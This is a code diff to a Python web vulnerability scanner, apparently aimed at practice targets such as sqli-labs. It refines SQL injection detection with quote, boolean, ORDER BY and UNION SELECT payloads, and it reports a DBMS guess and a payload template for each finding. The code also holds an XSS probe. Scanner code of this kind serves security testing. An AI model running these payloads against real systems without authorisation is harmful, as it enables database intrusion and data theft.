@@ -21,6 +21,7 @@ STATUS_CONFIG = "配置建议"
 STATUS_INFO = "信息提示"
 STATUS_FAILED = "扫描失败"
 STATUS_NOTICE = "扫描提示"
+SQL_COMMENT_SUFFIX = "-- -"
 
 
 SQL_ERROR_PATTERNS = [
@@ -311,6 +312,7 @@ class AuditorAgent:
         if quote_probe and self._has_sql_error(quote_probe.get("body", "")):
             followup = self._sqli_error_followup(url, param, context_params)
             payloads = ["1'", *followup.get("payloads", [])]
+            details = self._sqli_details(quote_probe.get("body", ""), followup)
             evidence = "单引号 payload 触发了数据库错误特征。"
             if followup.get("column_count"):
                 evidence += f" ORDER BY 探测推测列数为 {followup['column_count']}。"
@@ -329,13 +331,15 @@ class AuditorAgent:
                 request_response={
                     "error_probe": self._evidence_block(quote_probe, matched="SQL error pattern"),
                     "followup": followup,
+                    "sqli_details": details,
                 },
+                details=details,
             )
 
         payload_pairs = [
             ("1 AND 1=1", "1 AND 1=2"),
-            ("1' AND '1'='1' #", "1' AND '1'='2' #"),
-            ("1' AND 1=1 #", "1' AND 1=2 #"),
+            (f"1' AND '1'='1' {SQL_COMMENT_SUFFIX}", f"1' AND '1'='2' {SQL_COMMENT_SUFFIX}"),
+            (f"1' AND 1=1 {SQL_COMMENT_SUFFIX}", f"1' AND 1=2 {SQL_COMMENT_SUFFIX}"),
         ]
         for true_payload, false_payload in payload_pairs:
             true_probe = self._http_get(self._mutate_url(url, param, true_payload, context_params))
@@ -372,7 +376,7 @@ class AuditorAgent:
         first_error_column = 0
 
         for column in range(1, 9):
-            payload = f"1' ORDER BY {column}-- "
+            payload = f"1' ORDER BY {column} {SQL_COMMENT_SUFFIX}"
             response = self._http_get(self._mutate_url(url, param, payload, context_params))
             if not response:
                 break
@@ -399,7 +403,7 @@ class AuditorAgent:
         if column_count > 0:
             markers = [f"NOVA{index}" for index in range(1, column_count + 1)]
             select_list = ",".join(f"'{marker}'" for marker in markers)
-            union_payload = f"-1' UNION SELECT {select_list}-- "
+            union_payload = f"-1' UNION SELECT {select_list} {SQL_COMMENT_SUFFIX}"
             response = self._http_get(self._mutate_url(url, param, union_payload, context_params))
             payloads.append(union_payload)
             if response:
@@ -419,8 +423,61 @@ class AuditorAgent:
             "column_count": column_count,
             "union_probe": union_probe,
             "union_marker_reflected": union_marker_reflected,
+            "comment_suffix": SQL_COMMENT_SUFFIX,
             "note": "后续 payload 仅用于授权靶场的错误回显、列数和 UNION 回显点验证。",
         }
+
+    def _sqli_details(self, error_body: str, followup: dict) -> dict:
+        column_count = int(followup.get("column_count") or 0)
+        reflected_columns = self._reflected_columns(followup)
+        techniques = ["错误回显 SQL 注入"]
+        if column_count:
+            techniques.append("ORDER BY 列数探测")
+        if followup.get("union_marker_reflected"):
+            techniques.append("UNION SELECT 回显验证")
+
+        return {
+            "dbms_guess": self._guess_dbms(error_body),
+            "injection_context": "单引号字符串闭合",
+            "comment_suffix": SQL_COMMENT_SUFFIX,
+            "techniques": techniques,
+            "column_count": column_count,
+            "reflected_columns": reflected_columns,
+            "visible_columns": reflected_columns,
+            "payload_pattern": self._sqli_payload_pattern(column_count, reflected_columns),
+            "note": "sqli-labs Less-1 属于单引号字符串型错误回显注入；复制 payload 时需要保留注释后缀，避免原 SQL 的 LIMIT 0,1 继续拼接。",
+        }
+
+    def _guess_dbms(self, body: str) -> str:
+        lowered = body.lower()
+        if "mysql" in lowered or "mysqli" in lowered:
+            return "MySQL/MariaDB"
+        if "postgresql" in lowered or "postgres" in lowered:
+            return "PostgreSQL"
+        if "sqlite" in lowered:
+            return "SQLite"
+        if "ora-" in lowered or "oracle" in lowered:
+            return "Oracle"
+        if "odbc" in lowered or "sql server" in lowered:
+            return "SQL Server"
+        return "未知"
+
+    def _reflected_columns(self, followup: dict) -> list[int]:
+        markers = (followup.get("union_probe") or {}).get("reflected_markers") or []
+        columns: list[int] = []
+        for marker in markers:
+            match = re.search(r"NOVA(\d+)", str(marker))
+            if match:
+                columns.append(int(match.group(1)))
+        return columns
+
+    def _sqli_payload_pattern(self, column_count: int, reflected_columns: list[int]) -> str:
+        if column_count <= 0:
+            return f"1' <SQL> {SQL_COMMENT_SUFFIX}"
+        visible = reflected_columns[0] if reflected_columns else min(2, column_count)
+        columns = [str(index) for index in range(1, column_count + 1)]
+        columns[visible - 1] = "<表达式>"
+        return f"-1' UNION SELECT {','.join(columns)} {SQL_COMMENT_SUFFIX}"
 
     def _probe_reflection(self, url: str, param: str, context_params: dict, finding_index: int) -> dict | None:
         payloads = [("xss", "<script>alert(1)</script>")]
@@ -605,6 +662,7 @@ class AuditorAgent:
         payloads: list[str],
         status: str,
         request_response: dict | None = None,
+        details: dict | None = None,
     ) -> dict:
         return {
             "id": finding_id,
@@ -619,6 +677,7 @@ class AuditorAgent:
             "evidence": evidence,
             "payloads": payloads,
             "request_response": request_response or {},
+            "details": details or {},
             "recommendation": self._default_recommendation(category),
             "llm_analysis": "",
         }
